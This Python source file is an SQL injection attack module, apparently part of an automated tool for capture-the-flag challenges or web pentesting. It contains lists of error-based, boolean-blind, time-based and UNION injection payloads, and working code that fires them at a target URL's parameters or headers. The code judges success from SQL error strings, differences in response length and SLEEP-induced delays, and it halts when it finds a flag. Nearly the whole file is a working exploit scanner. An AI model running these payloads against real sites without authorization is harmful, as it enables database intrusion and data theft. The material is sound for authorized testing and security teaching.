"""
SQL Injection attack module.
Covers: error-based, boolean-based blind, time-based blind, union-based.
"""
from __future__ import annotations
import time

from attacks.base import BaseAttack
from engine.flag_hunter import has_definite_flag
from rich.console import Console

console = Console()

ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ora-0", "pg_query", "sqlite_",
    "mssql", "microsoft sql", "syntax error", "unclosed quotation",
    "you have an error in your sql", "warning: mysql", "division by zero",
    "supplied argument is not a valid mysql", "column count doesn't match",
    "unknown column", "table or view does not exist", "quoted string not properly terminated",
]

TIME_PAYLOADS = [
    "' AND SLEEP(3)-- ",
    "' AND SLEEP(3)#",
    "' OR SLEEP(3)-- ",       # login form: WHERE user='X' OR SLEEP(3)-- '
    "' OR SLEEP(3)#",
    "' AND pg_sleep(3)-- ",
    "'; WAITFOR DELAY '0:0:3'-- ",
    "1 AND SLEEP(3)-- ",
    "1 AND SLEEP(3)#",
    "1 OR SLEEP(3)-- ",
    "1; SELECT pg_sleep(3)-- ",
]

# (true_condition, false_condition) pairs for boolean-blind detection.
# If the server returns different responses for these, SQL is evaluated server-side.
BOOLEAN_PAIRS = [
    ("' AND '1'='1'-- ", "' AND '1'='2'-- "),   # string context, MySQL/MSSQL
    ("' AND 1=1-- ", "' AND 1=2-- "),             # alt syntax
    ("1 AND 1=1-- ", "1 AND 1=2-- "),             # numeric param
    ("' OR '1'='1'-- ", "' OR '1'='2'-- "),      # login form (WHERE user=X OR ...)
]

ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "1' AND 1=CONVERT(int, @@version)--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' UNION SELECT null,null,null--",
]


class SQLiAttack(BaseAttack):
    name = "sqli"

    async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
        url = attack_point["url"]
        param = attack_point.get("param")
        method = attack_point.get("method", "GET")
        is_header = attack_point.get("input_type") == "header"

        if not param:
            return []

        location = f"header:{param}" if is_header else f"?{param}"
        console.print(f"  [cyan][SQLi][/cyan] {method} {url} {location}")

        all_findings = []
        seen = set(payloads or [])
        extra = [p for p in ERROR_PAYLOADS if p not in seen]
        combined_payloads = list(payloads or []) + extra

        # Phase 1: Error-based
        error_confirmed = False
        for payload in combined_payloads:
            if self._should_stop():
                break

            response, findings = await self._try_payload(
                method, url, param, payload, as_header=is_header
            )
            if response is None:
                continue

            body_lower = response.text.lower()
            is_error_based = any(sig in body_lower for sig in ERROR_SIGNATURES)

            if is_error_based and not error_confirmed:
                error_confirmed = True
                console.print(f"  [bold red][SQLi][/bold red] Error-based hit! Payload: {payload!r}")
                all_findings.append({
                    "type": "sqli_error",
                    "value": f"Error-based SQLi @ {url} {location} payload={payload!r}",
                    "confidence": 0.9,
                })

            flag_findings = [f for f in findings if f.get("confidence", 0) >= 1.0]
            if flag_findings:
                all_findings.extend(flag_findings)
                flag = has_definite_flag(flag_findings)
                if flag:
                    console.print(f"  [bold green][SQLi][/bold green] FLAG: {flag}")
                    self.stop_event.set()
                    return all_findings

            if error_confirmed:
                break

        # Phase 2: Boolean-blind (only if no error found — fast, 2 req/pair)
        boolean_confirmed = False
        if not error_confirmed:
            bl_resp, _ = await self._try_payload(
                method, url, param, "tweb_bool_baseline_noop", as_header=is_header
            )
            bl_len = len(bl_resp.text) if bl_resp else -1

            for true_pay, false_pay in BOOLEAN_PAIRS:
                if self._should_stop():
                    break
                true_resp, _ = await self._try_payload(
                    method, url, param, true_pay, as_header=is_header
                )
                false_resp, _ = await self._try_payload(
                    method, url, param, false_pay, as_header=is_header
                )
                if true_resp is None or false_resp is None:
                    continue

                t_len = len(true_resp.text)
                f_len = len(false_resp.text)
                diff = abs(t_len - f_len)
                threshold = max(100, int(max(t_len, f_len) * 0.10))

                if diff >= threshold:
                    # At least one side should resemble the baseline (rules out
                    # both conditions returning unrelated different content).
                    if bl_len > 0:
                        true_near_bl = abs(t_len - bl_len) < threshold
                        false_near_bl = abs(f_len - bl_len) < threshold
                        if not (true_near_bl or false_near_bl):
                            continue

                    boolean_confirmed = True
                    console.print(
                        f"  [bold red][SQLi][/bold red] Boolean-blind hit! "
                        f"true:{t_len}B vs false:{f_len}B (diff:{diff}) "
                        f"Payload: {true_pay!r}"
                    )
                    all_findings.append({
                        "type": "sqli_boolean_blind",
                        "value": (
                            f"Boolean-blind SQLi @ {url} {location} "
                            f"(diff:{diff}B, payload={true_pay!r})"
                        ),
                        "confidence": 0.8,
                    })
                    break

        # Phase 3: Time-based (only if no error or boolean found — slow, 3s/payload)
        if not error_confirmed and not boolean_confirmed:
            baseline_time = 0.0
            try:
                t_b = time.monotonic()
                await self._try_payload(
                    method, url, param, "tweb_timebased_baseline_noop", as_header=is_header
                )
                baseline_time = time.monotonic() - t_b
            except Exception:
                pass

            for time_payload in TIME_PAYLOADS:
                if self._should_stop():
                    break
                t0 = time.monotonic()
                response, findings = await self._try_payload(
                    method, url, param, time_payload, as_header=is_header
                )
                elapsed = time.monotonic() - t0

                # Skip timeouts (response=None, elapsed≈10s): a timeout is DB overload or
                # a network error — not a confirmed SLEEP.  Real SLEEP(3) returns a response
                # in ~3-5s; only that qualifies as time-based detection.
                if response is None:
                    continue

                if elapsed >= 2.8 and (elapsed - baseline_time) >= 2.5:
                    console.print(
                        f"  [bold red][SQLi][/bold red] Time-based hit! "
                        f"({elapsed:.1f}s, baseline {baseline_time:.1f}s) Payload: {time_payload!r}"
                    )
                    all_findings.append({
                        "type": "sqli_time_based",
                        "value": f"Time-based SQLi ({elapsed:.1f}s) @ {url} {location}",
                        "confidence": 0.85,
                    })
                    break

        return all_findings
